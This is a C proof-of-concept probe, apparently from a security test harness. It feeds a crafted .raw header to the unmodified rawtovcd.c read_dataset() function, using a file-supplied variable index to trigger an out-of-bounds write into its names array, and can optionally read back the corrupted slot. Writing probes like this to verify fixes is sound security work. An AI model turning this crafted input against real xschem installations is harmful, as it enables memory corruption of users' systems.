/* xschem2shell probe: drives the VERBATIM pinned rawtovcd.c read_dataset()
 * through a crafted in-memory .raw header. No pinned source line is edited. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define main rawtovcd_pin_main
#include PIN_PATH
#undef main

int main(int argc, char **argv) {
  const char *mode;   /* attack | safe */
  int idx;            /* file-carried names[] index */
  char varname[32];
  char raw[4096];
  int n;

  if (argc < 2 || argc > 3) {
    fprintf(stderr, "usage: probe attack|safe [index]\n");
    return 2;
  }
  mode = argv[1];
  idx = (argc == 3) ? atoi(argv[2]) : (!strcmp(mode, "attack") ? 2 : 1);
  memset(varname, 'H', 20);
  varname[20] = '\0';

  n = snprintf(raw, sizeof(raw),
      "Title: crafted\n"
      "Plotname: Transient Analysis\n"
      "No. Variables: 2\n"
      "No. Points: 0\n"
      "Variables:\n"
      "0 time time\n"
      "1 v(a) voltage\n"
      "%d %s\n"
      "Binary:\n", idx, varname);
  if (n < 0 || (size_t)n >= sizeof(raw)) return 2;
  fd = fmemopen(raw, (size_t)n, "r");
  if (!fd) return 2;
  debug = 0;

  int res = read_dataset();
  printf("mode=%s idx=%d res=%d nvars=%d names=%p\n",
         mode, idx, res, nvars, (void *)names);
  if (fd) fclose(fd);

#ifdef READBACK
  /* Plain vulnerable build only: read back the 8 bytes at the OOB slot.
   * ASan builds abort at the store; the fixed build has no OOB slot. */
  if (res == 1) {
    unsigned char *slot = (unsigned char *)&names[idx];
    printf("slot_bytes=");
    for (n = 0; n < 8; n++) printf("%02x", slot[n]);
    printf("\n");
  }
#endif
  return 0;
}
